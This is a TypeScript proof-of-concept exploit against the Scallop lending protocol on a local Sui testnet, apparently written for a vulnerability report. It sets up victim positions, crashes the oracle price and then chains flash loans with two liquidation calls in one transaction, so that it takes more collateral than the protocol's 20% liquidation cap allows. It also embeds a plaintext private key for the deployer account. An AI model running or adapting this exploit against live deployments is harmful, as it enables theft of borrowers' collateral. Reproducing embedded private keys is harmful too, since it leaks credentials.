// @ts-nocheck
/**
* PoC: Multi-Call Liquidation Bypasses 20% Soft Cap (FIXED VERSION)
* Target: Scallop Protocol (Local Testnet)
* SDK: @mysten/sui (Official)
* 
* FIXES:
* 1. Dynamic object ID discovery (no hardcoded IDs)
* 2. Proper sCoin handling (no destroy_zero aborts)
* 3. Registry/Oracle/Market synchronization
* 4. Better error handling and transaction sequencing
*/
import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// PRIVATE KEY FUNDER (DEPLOYER)
const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

const SUI_TYPE = "0x2::sui::SUI";
const CLOCK = "0x6";

// Global variables to store discovered IDs
let PKG = "";
let VERSION = "";
let MARKET = "";
let ORACLE = "";
let REGISTRY = "";
let TEST_COIN_PKG = "";
let USDC_TYPE = "";
let ETH_TYPE = "";
let USDC_TREASURY = "";
let ETH_TREASURY = "";
let ADMIN_CAP = "";
let X_ORACLE_PKG = "";

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER: EXECUTE TX ====================
async function executeTx(tx, keypair, label = "") {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        options: { showEffects: true, showObjectChanges: true },
    });
    await new Promise(r => setTimeout(r, 2000)); // Increased delay for localnet
    return result;
}

// ==================== HELPER: FIND OBJECTS BY TYPE ====================
async function findObjectsByType(owner, typePattern) {
    let cursor = null;
    const results = [];
    while (true) {
        const objects = await client.getOwnedObjects({
            owner,
            cursor,
            options: { showType: true, showContent: true },
        });
        for (const obj of objects.data) {
            const objType = obj.data?.type || "";
            if (objType.includes(typePattern)) {
                results.push(obj.data);
            }
        }
        if (!objects.hasNextPage) break;
        cursor = objects.nextCursor;
    }
    return results;
}

// ==================== PHASE 0: DISCOVER DEPLOYED IDS ====================
async function discoverIds() {
    console.log("[INIT] Discovering deployed object IDs dynamically...");
    
    // 1. Find AdminCap to get Protocol Package ID
    const adminCaps = await findObjectsByType(funderAddress, "::app::AdminCap");
    if (adminCaps.length === 0) {
        throw new Error("[INIT] AdminCap not found. Make sure funder is the deployer of the protocol.");
    }
    ADMIN_CAP = adminCaps[0].objectId;
    const adminCapType = adminCaps[0].type;
    PKG = adminCapType.split("::")[0];
    console.log(`[INIT] Protocol Package: ${PKG}`);
    console.log(`[INIT] AdminCap: ${ADMIN_CAP}`);

    // 2. Find Test Coin Package by looking at USDC/ETH coins owned by funder
    const allObjects = await client.getOwnedObjects({
        owner: funderAddress,
        options: { showType: true, showContent: true },
    });

    let usdcCoinType = "";
    let ethCoinType = "";
    for (const obj of allObjects.data) {
        const type = obj.data?.type || "";
        if (type.includes("::usdc::USDC") && type.includes("Coin<")) {
            usdcCoinType = type.match(/Coin<(.+)>/)?.[1] || "";
        }
        if (type.includes("::eth::ETH") && type.includes("Coin<")) {
            ethCoinType = type.match(/Coin<(.+)>/)?.[1] || "";
        }
    }

    if (!usdcCoinType || !ethCoinType) {
        throw new Error("[INIT] Could not find USDC or ETH coin types in funder's wallet. Make sure test coins are minted.");
    }

    TEST_COIN_PKG = usdcCoinType.split("::")[0];
    USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
    ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
    console.log(`[INIT] Test Coin Package: ${TEST_COIN_PKG}`);

    // 3. Find shared objects (Market, Version, Oracle, Registry) from deployment TX
    const adminCapObj = await client.getObject({ id: ADMIN_CAP, options: { showPreviousTransaction: true } });
    const deployTxDigest = adminCapObj.data?.previousTransaction;
    if (!deployTxDigest) {
        throw new Error("[INIT] Could not find deployment transaction for AdminCap.");
    }
    console.log(`[INIT] Protocol Deployment TX: ${deployTxDigest}`);

    const deployTx = await client.getTransactionBlock({
        digest: deployTxDigest,
        options: { showEffects: true, showObjectChanges: true },
    });

    for (const change of deployTx.objectChanges || []) {
        if (change.type === "created") {
            const objType = change.objectType || "";
            if (objType.includes("::market::Market")) MARKET = change.objectId;
            else if (objType.includes("::version::Version")) VERSION = change.objectId;
            else if (objType.includes("::x_oracle::XOracle")) {
                ORACLE = change.objectId;
                X_ORACLE_PKG = objType.split("::")[0];
            }
            else if (objType.includes("::coin_decimals_registry::CoinDecimalsRegistry")) REGISTRY = change.objectId;
        }
    }

    // 4. Find Treasuries from Test Coin deployment TX
    const publishers = await findObjectsByType(funderAddress, "::package::Publisher");
    for (const pub of publishers) {
        if (pub.type?.includes(TEST_COIN_PKG)) {
            const pubObj = await client.getObject({ id: pub.objectId, options: { showPreviousTransaction: true } });
            const testCoinTxDigest = pubObj.data?.previousTransaction;
            if (testCoinTxDigest) {
                console.log(`[INIT] Test Coin Deployment TX: ${testCoinTxDigest}`);
                const testCoinTx = await client.getTransactionBlock({
                    digest: testCoinTxDigest,
                    options: { showObjectChanges: true },
                });
                for (const change of testCoinTx.objectChanges || []) {
                    if (change.type === "created") {
                        const objType = change.objectType || "";
                        if (objType.includes("::usdc::Treasury")) USDC_TREASURY = change.objectId;
                        else if (objType.includes("::eth::Treasury")) ETH_TREASURY = change.objectId;
                    }
                }
            }
            break;
        }
    }

    if (!MARKET || !VERSION || !ORACLE || !REGISTRY || !USDC_TREASURY || !ETH_TREASURY || !X_ORACLE_PKG) {
        throw new Error(`[INIT] Failed to discover all required IDs.\nMarket: ${MARKET}\nVersion: ${VERSION}\nOracle: ${ORACLE}\nRegistry: ${REGISTRY}\nUSDC Treasury: ${USDC_TREASURY}\nETH Treasury: ${ETH_TREASURY}\nXOracle Pkg: ${X_ORACLE_PKG}`);
    }

    console.log(`[INIT] Market: ${MARKET}`);
    console.log(`[INIT] Version: ${VERSION}`);
    console.log(`[INIT] Oracle: ${ORACLE}`);
    console.log(`[INIT] Registry: ${REGISTRY}`);
    console.log(`[INIT] USDC Treasury: ${USDC_TREASURY}`);
    console.log(`[INIT] ETH Treasury: ${ETH_TREASURY}`);
    console.log(`[INIT] XOracle Package: ${X_ORACLE_PKG}`);
}

// ==================== HELPER: CARI COIN METADATA ID ====================
async function findCoinMetadata(coinType) {
    const response = await client.getCoinMetadata({ coinType });
    if (!response) throw new Error(`CoinMetadata not found for ${coinType}`);
    return response.id;
}

// ==================== HELPER FUNCTIONS ====================
async function printBalances(address) {
    const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
    const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
    const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
    console.log(
        `[DEBUG] Balances for ${address.slice(0, 8)}...: ` +
        `SUI=${Number(suiBalance.totalBalance) / 1e9} | ` +
        `USDC=${Number(usdcBalance.totalBalance) / 1e9} | ` +
        `ETH=${Number(ethBalance.totalBalance) / 1e9}`
    );
}

async function readObligationState(obligationId) {
    const fields = await client.getDynamicFields({ parentId: obligationId });
    let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;
    for (const field of fields.data) {
        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
        const fieldName = JSON.stringify(field.name);
        const fieldValue = fieldData?.data?.content?.fields;
        if (fieldName.includes("Collateral") && fieldValue) collateralAmount = BigInt(fieldValue.amount || 0);
        else if (fieldName.includes("Debt") && fieldValue) {
            if (fieldName.includes("USDC")) debtUSDC = BigInt(fieldValue.amount || 0);
            else if (fieldName.includes("ETH")) debtETH = BigInt(fieldValue.amount || 0);
        }
    }
    return { collateralAmount, debtUSDC, debtETH };
}

// ==================== PHASE 0: INITIALIZE MARKET ====================
async function initializeMarket() {
    console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle)...");
    const suiMetaId = await findCoinMetadata(SUI_TYPE);
    const usdcMetaId = await findCoinMetadata(USDC_TYPE);
    const ethMetaId = await findCoinMetadata(ETH_TYPE);
    const tx = new Transaction();
    tx.moveCall({
        target: `${PKG}::app::whitelist_allow_all`,
        arguments: [tx.object(ADMIN_CAP), tx.object(MARKET)],
    });
    tx.moveCall({
        target: `${PKG}::app::init_market_coin_price_table`,
        arguments: [tx.object(ADMIN_CAP), tx.object(MARKET)],
    });
    const SCALE = 10n ** 12n;
    const addInterestModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_interest_model_change`,
            typeArguments: [coinType],
            arguments: [
                tx.object(ADMIN_CAP), tx.pure.u64(p.baseBorrowRatePerSec), tx.pure.u64(p.interestRateScale),
                tx.pure.u64(p.borrowRateOnMidKink), tx.pure.u64(p.midKink), tx.pure.u64(p.borrowRateOnHighKink),
                tx.pure.u64(p.highKink), tx.pure.u64(p.maxBorrowRate), tx.pure.u64(p.revenueFactor),
                tx.pure.u64(p.borrowWeight), tx.pure.u64(p.scale), tx.pure.u64(p.minBorrowAmount),
            ],
        });
        tx.moveCall({
            target: `${PKG}::app::add_interest_model`,
            typeArguments: [coinType],
            arguments: [tx.object(MARKET), tx.object(ADMIN_CAP), modelChange, tx.object(CLOCK)],
        });
    };
    const addRiskModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_risk_model_change`,
            typeArguments: [coinType],
            arguments: [
                tx.object(ADMIN_CAP), tx.pure.u64(p.collateralFactor), tx.pure.u64(p.liquidationFactor),
                tx.pure.u64(p.liquidationPanelty), tx.pure.u64(p.liquidationDiscount), tx.pure.u64(p.scale),
                tx.pure.u64(p.maxCollateralAmount),
            ],
        });
        tx.moveCall({
            target: `${PKG}::app::add_risk_model`,
            typeArguments: [coinType],
            arguments: [tx.object(MARKET), tx.object(ADMIN_CAP), modelChange],
        });
    };
    const addLimiter = (coinType, limit, cycle, segment) => {
        tx.moveCall({
            target: `${PKG}::app::add_limiter`,
            typeArguments: [coinType],
            arguments: [tx.object(ADMIN_CAP), tx.object(MARKET), tx.pure.u64(limit), tx.pure.u32(cycle), tx.pure.u32(segment)],
        });
    };
    const registerDecimals = (coinType, metadataId) => {
        tx.moveCall({
            target: `${PKG}::coin_decimals_registry::register_decimals`,
            typeArguments: [coinType],
            arguments: [tx.object(REGISTRY), tx.object(metadataId)],
        });
    };
    const setMinCollateral = (coinType, amount) => {
        tx.moveCall({
            target: `${PKG}::app::update_min_collateral_amount`,
            typeArguments: [coinType],
            arguments: [tx.object(ADMIN_CAP), tx.object(MARKET), tx.pure.u64(amount)],
        });
    };
    const setSupplyLimit = (coinType, limit) => {
        tx.moveCall({
            target: `${PKG}::app::update_supply_limit`,
            typeArguments: [coinType],
            arguments: [tx.object(ADMIN_CAP), tx.object(MARKET), tx.pure.u64(limit)],
        });
    };

    // SUI
    registerDecimals(SUI_TYPE, suiMetaId);
    addInterestModel(SUI_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 125n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(SUI_TYPE, {
        collateralFactor: 60n, liquidationFactor: 70n, liquidationPanelty: 10n,
        liquidationDiscount: 7n, scale: 100n, maxCollateralAmount: 10n ** 17n,
    });
    addLimiter(SUI_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(SUI_TYPE, 0n);
    setSupplyLimit(SUI_TYPE, 10n ** 18n);

    // USDC
    registerDecimals(USDC_TYPE, usdcMetaId);
    addInterestModel(USDC_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 8n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 50n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 150n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(USDC_TYPE, {
        collateralFactor: 90n, liquidationFactor: 95n, liquidationPanelty: 3n,
        liquidationDiscount: 2n, scale: 100n, maxCollateralAmount: 10n ** 17n,
    });
    addLimiter(USDC_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(USDC_TYPE, 0n);
    setSupplyLimit(USDC_TYPE, 10n ** 18n);

    // ETH
    registerDecimals(ETH_TYPE, ethMetaId);
    addInterestModel(ETH_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(ETH_TYPE, {
        collateralFactor: 80n, liquidationFactor: 90n, liquidationPanelty: 8n,
        liquidationDiscount: 5n, scale: 100n, maxCollateralAmount: 10n ** 16n,
    });
    addLimiter(ETH_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(ETH_TYPE, 0n);
    setSupplyLimit(ETH_TYPE, 10n ** 18n);

    await executeTx(tx, funderKeypair, "INIT_MARKET");
    console.log("[INIT] Market initialized successfully!");
}

// ==================== WHITELIST VICTIM ====================
async function whitelistVictim(victimAddr, label) {
    console.log(`[${label}] Step 2.5: Whitelisting victim ${victimAddr.slice(0, 8)}...`);
    const tx = new Transaction();
    tx.moveCall({
        target: `${PKG}::app::add_whitelist_address`,
        arguments: [tx.object(ADMIN_CAP), tx.object(MARKET), tx.pure.address(victimAddr)],
    });
    await executeTx(tx, funderKeypair, "WHITELIST");
    console.log(`[${label}] Step 2.5 done: Victim whitelisted`);
}

// ==================== PHASE 1: SETUP VICTIM ====================
async function setupVictim(victimKeypair, label) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
    
    // Step 1: Fund victim
    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr);
    await executeTx(fundTx, funderKeypair, "FUND");
    console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);
    
    // Step 2: Open obligation
    const openTx = new Transaction();
    openTx.moveCall({
        target: `${PKG}::open_obligation::open_obligation_entry`,
        arguments: [openTx.object(VERSION)],
    });
    const openResult = await executeTx(openTx, victimKeypair, "OPEN");
    let obligationId = "", obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) obligationKeyId = obj.objectId;
        else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) obligationId = obj.objectId;
    }
    if (!obligationId || !obligationKeyId) throw new Error(`[${label}] Failed to parse obligationId or obligationKeyId.`);
    console.log(`[${label}] Obligation ID: ${obligationId} | Key: ${obligationKeyId}`);
    
    // Step 2.5: Whitelist
    await whitelistVictim(victimAddr, label);
    
    // Step 3: Deposit collateral
    const depositTx = new Transaction();
    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
    depositTx.moveCall({
        target: `${PKG}::deposit_collateral::deposit_collateral`,
        typeArguments: [SUI_TYPE],
        arguments: [depositTx.object(VERSION), depositTx.object(obligationId), depositTx.object(MARKET), collateralCoin],
    });
    await executeTx(depositTx, victimKeypair, "DEPOSIT");
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);
    
    // Step 4: Mint & Supply USDC & ETH ke Market (by Funder)
    const supplyTx = new Transaction();
    const [usdcCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::usdc::mint`,
        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)],
    });
    const [sUSDC] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [USDC_TYPE],
        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)],
    });
    supplyTx.transferObjects([sUSDC], funderAddress); // FIX: Transfer sCoin, jangan biarkan zero
    
    const [ethCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::eth::mint`,
        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)],
    });
    const [sETH] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [ETH_TYPE],
        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)],
    });
    supplyTx.transferObjects([sETH], funderAddress); // FIX: Transfer sCoin
    
    await executeTx(supplyTx, funderKeypair, "SUPPLY");
    console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);
    
    // Step 4.5: Initialize oracle prices
    const initPriceTx = new Transaction();
    initPriceTx.moveCall({
        target: `${X_ORACLE_PKG}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(100_000_000n)],
    });
    initPriceTx.moveCall({
        target: `${X_ORACLE_PKG}::x_oracle::update_price`,
        typeArguments: [USDC_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(100_000_000n)],
    });
    initPriceTx.moveCall({
        target: `${X_ORACLE_PKG}::x_oracle::update_price`,
        typeArguments: [ETH_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(200_000_000_000n)],
    });
    await executeTx(initPriceTx, funderKeypair, "ORACLE_INIT");
    console.log(`[${label}] Step 4.5 done: Initialized oracle prices (SUI=$1, USDC=$1, ETH=$2000)`);
    
    // Step 5: Borrow USDC
    const borrowUSDCTx = new Transaction();
    const [borrowedUSDC] = borrowUSDCTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [USDC_TYPE],
        arguments: [
            borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId),
            borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(500_000_000n),
            borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK),
        ],
    });
    borrowUSDCTx.transferObjects([borrowedUSDC], victimAddr);
    await executeTx(borrowUSDCTx, victimKeypair, "BORROW_USDC");
    console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);
    
    // Step 6: Borrow ETH
    const borrowETHTx = new Transaction();
    const [borrowedETH] = borrowETHTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [ETH_TYPE],
        arguments: [
            borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId),
            borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(200_000_000n),
            borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK),
        ],
    });
    borrowETHTx.transferObjects([borrowedETH], victimAddr);
    await executeTx(borrowETHTx, victimKeypair, "BORROW_ETH");
    console.log(`[${label}] Step 6 done: Borrowed 0.2 ETH`);
    
    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================
async function crashOraclePrice() {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
    const tx = new Transaction();
    tx.moveCall({
        target: `${X_ORACLE_PKG}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000n)],
    });
    await executeTx(tx, funderKeypair, "CRASH_ORACLE");
    console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
}

// ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================
async function beforeExploit_singleCall(victimObligationId) {
    console.log("\n" + "=".repeat(60));
    console.log("BEFORE EXPLOIT: Single Liquidation Call");
    console.log("=".repeat(60));
    const stateBefore = await readObligationState(victimObligationId);
    console.log(`[BEFORE] Collateral SUI: ${stateBefore.collateralAmount}`);
    
    const tx = new Transaction();
    const [flashUSDC, flashReceipt] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
    });
    const [remainUSDC, collateralCoin] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), flashUSDC,
            tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK),
        ],
    });
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
    });
    tx.transferObjects([collateralCoin], funderAddress);
    await executeTx(tx, funderKeypair, "LIQUIDATE_SINGLE");
    
    const stateAfter = await readObligationState(victimObligationId);
    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[BEFORE] Single-call extracted: ${extracted} SUI (Expected: ~20% cap)`);
    return { extracted };
}

// ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================
async function afterExploit_multiCall(victimObligationId) {
    console.log("\n" + "=".repeat(60));
    console.log("AFTER EXPLOIT: Multi-Call Liquidation (THE BYPASS)");
    console.log("=".repeat(60));
    const stateBefore = await readObligationState(victimObligationId);
    
    const tx = new Transaction();
    const [f_USDC, r_USDC] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
    });
    const [f_ETH, r_ETH] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)],
    });
    
    // Liquidation 1: USDC vs SUI
    const [rem1, c1] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC,
            tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK),
        ],
    });
    
    // Liquidation 2: ETH vs SUI (BYPASS 20% CAP!)
    const [rem2, c2] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [ETH_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH,
            tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK),
        ],
    });
    
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
    });
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH],
    });
    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([c1], funderAddress);
    
    await executeTx(tx, funderKeypair, "LIQUIDATE_MULTI");
    
    const stateAfter = await readObligationState(victimObligationId);
    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[AFTER] Multi-call extracted: ${extracted} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN EXECUTION ====================
async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (FIXED VERSION)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");
    
    console.log("\n[DEBUG] Checking Funder Balances...");
    await printBalances(funderAddress);
    
    // Discover all IDs dynamically (NO HARDCODING!)
    await discoverIds();
    
    // Initialize market (safe to run multiple times)
    try {
        await initializeMarket();
    } catch (e) {
        console.log("[INIT] Market might already be initialized or fields exist. Continuing...");
    }
    
    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();
    const vA = await setupVictim(victimA, "VICTIM A");
    const vB = await setupVictim(victimB, "VICTIM B");
    
    await crashOraclePrice();
    
    console.log("\n[DEBUG] Checking Funder Balances before Exploits...");
    await printBalances(funderAddress);
    
    const beforeResult = await beforeExploit_singleCall(vA.obligationId);
    const afterResult = await afterExploit_multiCall(vB.obligationId);
    
    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);
    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
}

main().catch(console.error);
